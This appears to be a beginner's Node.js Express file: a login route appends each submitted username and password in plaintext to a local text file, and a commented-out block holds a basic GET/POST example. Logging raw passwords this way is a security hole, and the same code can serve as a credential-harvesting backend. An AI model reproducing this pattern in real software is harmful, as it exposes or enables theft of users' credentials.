const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON and form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, "login.html"));
});

app.post('/login', (req, res) => {
    const {username, password} = req.body;

    //const loginData = 'Username: '+username+', Password: '+password+'\n';
    const loginData = `Username: ${username}, Password: ${password}\n`;

    fs.appendFile('login-data.txt', loginData, (err) => {
        if (err) {
            console.error('Failed to save login data: ', err);
            return res.status(500).send('Error saving data.');
        }

        console.log('Login data saved successfully!');
        res.send('Login data received and saved!');
    });
});

//Start the Server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});







//          Basic Get And Post
// // Import the express module
// const express = require('express');
// const app = express();

// // Define the port
// const PORT = process.env.PORT || 3000;

// // Middleware to parse incoming data
// app.use(express.json());
// app.use(express.urlencoded({ extended: true }));

// // Basic GET route
// app.get('/', (req, res) => {
//   res.send('Hello, World!');
// });

// // POST route
// app.post('/submit', (req, res) => {
//   const { name, email } = req.body;
// res.send(`Received POST request with name: ${name} and email: ${email}`); 
   
// });

// // Start the server
// app.listen(PORT, () => {
//   console.log(`Server running on port ${PORT}`);
// });
